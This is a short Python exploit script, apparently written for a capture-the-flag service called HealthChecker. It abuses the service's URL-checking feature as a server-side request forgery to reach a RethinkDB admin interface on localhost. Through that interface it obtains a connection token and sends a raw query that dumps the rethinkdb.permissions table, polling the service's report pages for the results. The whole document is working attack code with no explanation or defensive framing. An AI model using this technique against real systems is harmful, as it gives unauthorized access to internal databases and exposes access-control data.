#!/usr/bin/env python3

# Exploit for HealthChecker. Retrieves rethinkdb.permissions table.

import requests, re, time, json
from html import unescape
from ast import literal_eval

SERVICE_URL = "http://127.0.0.1:5000/"

def add_target(url, method, body):
    requests.post(SERVICE_URL, data={"url": url, "method": method, "body": body}).text

def list_targets():
    result = requests.get(SERVICE_URL)
    assert result.status_code == 200
    return re.findall("<h3>Reports for (.+?)</h3>(?:.|\n)*?Url: (.+?)\n(?:.|\n)*?Method: (GET|POST)\nBody: (.*?)</pre>(?:(?:.|\n)*?<tbody>(?:(?:\n|.)*?<tr>(?:\n|.)*?<td>.*?</td>(?:\n|.)*?<td>(.*?)</td>(?:\n|.)*?</tr>(?:\n|.)*?)?</tbody>)?", result.text)

def delete_target(target_id):
    requests.post(f"{SERVICE_URL}/delete/{target_id}")

def make_request(url, method, body):
    while True:
        for target_id, url_, method_, body_, last_answer in list_targets():
            if unescape(url_) == url and method_ == method and unescape(body_) == body:
                if last_answer:
                    last_answer = literal_eval(unescape(last_answer))
                    print(f" Answer found: {last_answer}")
                    delete_target(target_id)
                    return last_answer 
                print(".", flush=True, end="")
                time.sleep(5)
                break
        else:
            print("Adding new target...")
            add_target(url, method, body)
            print("Waiting for an answer", end="", flush=True)

def retrieve_token():
    return make_request("http://127.0.0.1:8080/ajax/reql/open-new-connection", "POST", "").decode()

def dump_table(token, db, table):
    query = [1,[15,[[14,[db]],table]],{"binary_format":"raw","time_format":"raw","profile":False}]
    return make_request(f"http://127.0.0.1:8080/ajax/reql/?conn_id={token}", "POST", "\x01\x00\x00\x00\x00\x00\x00\x00" + json.dumps(query))

if __name__ == "__main__":
    token = retrieve_token()
    print(dump_table(token, "rethinkdb", "permissions"))
